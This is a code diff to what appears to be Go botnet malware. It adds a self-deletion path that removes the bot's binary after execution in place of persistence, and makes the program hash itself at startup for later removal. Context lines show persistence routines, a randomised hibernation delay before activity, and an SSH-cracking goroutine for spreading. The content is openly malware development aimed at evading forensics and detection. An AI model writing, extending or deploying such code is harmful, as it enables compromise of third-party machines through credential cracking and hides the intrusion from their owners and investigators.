@@ -67,9 +67,17 @@ func tick(host string) bool {
 
 func initialize() {
 	// Check if the bot is persistent within the environment, if not then persist.
-	if !checkIfPersisted() {
-		err := persist()
-		fmt.Println(err)
+	// But only if we're not set to remove the binary up on execution.
+	if !removeSelf {
+		if !checkIfPersisted() {
+			err := persist()
+			fmt.Println(err)
+		}
+	} else {
+		err := removeBinary()
+		if err != nil {
+			fmt.Println(err)
+		}
 	}
 
 	// Initialize a SQLite database and run the migrations.
@@ -112,8 +120,6 @@ func initialize() {
 			go sshCrackRoutine()
 		}
 	}
-
-	fmt.Println(botDetails)
 }
 
 // prepare handles the code executed immediately.
@@ -124,6 +130,14 @@ func prepare() {
 		rand.Seed(time.Now().UnixNano())
 		time.Sleep(time.Minute * time.Duration(rand.Intn(hybernateMax-hybernateMin)+hybernateMax))
 	}
+
+	// Calculate hash of itself, so that later we can delete the binary if needed.
+	hash, err := hashSelf()
+	if err != nil {
+		fmt.Println(err)
+		panic(err)
+	}
+	selfHash = hash
 }
 
 func main() {
